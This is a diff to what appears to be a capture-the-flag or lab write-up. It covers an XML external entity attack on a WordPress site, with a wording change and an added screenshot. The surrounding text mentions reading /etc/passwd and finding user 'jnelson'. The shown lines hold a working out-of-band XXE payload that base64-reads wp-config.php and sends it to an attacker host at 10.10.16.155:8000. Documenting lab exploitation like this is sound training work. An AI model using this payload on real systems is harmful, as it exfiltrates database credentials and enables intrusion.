@@ -145,8 +145,12 @@ ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
 
 <br>
 
-It is confirmed that there is one user that has bash shell excluding root user, `jnelson`. Confirming the paylaod is working properly, since web administrator has privilege to read configuration file of the web application including `/wp-admin` directory, attacker now could read the contents of `wp-config.php`, which mostly contains the configuration information about `WordPress` based web application via directory traversal attack if the attacker does not know the exact location of the file by using `..` in front of the file directory. Following is the final payload for targeting the contents of `wp-config.php`:
+It is confirmed that there is one user that has bash shell excluding root user, `jnelson`. Confirming the paylaod is working properly, since web administrator has privilege to read configuration file of the web application including `/wp-admin` directory, attacker now could read the contents of `wp-config.php`, which mostly contains the configuration information about `WordPress` based web application via directory traversal attack if the attacker does not know the exact location of the file by using `..` in front of the file directory. Following are the final payload for targeting the contents of `wp-config.php` and execution result:
 ```bash
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
 <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.155:8000/?p=%file;'>">
 ```
+<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/abcd3248-d89e-4fa5-baba-66ffd5e0e0e1" />
+
+
+
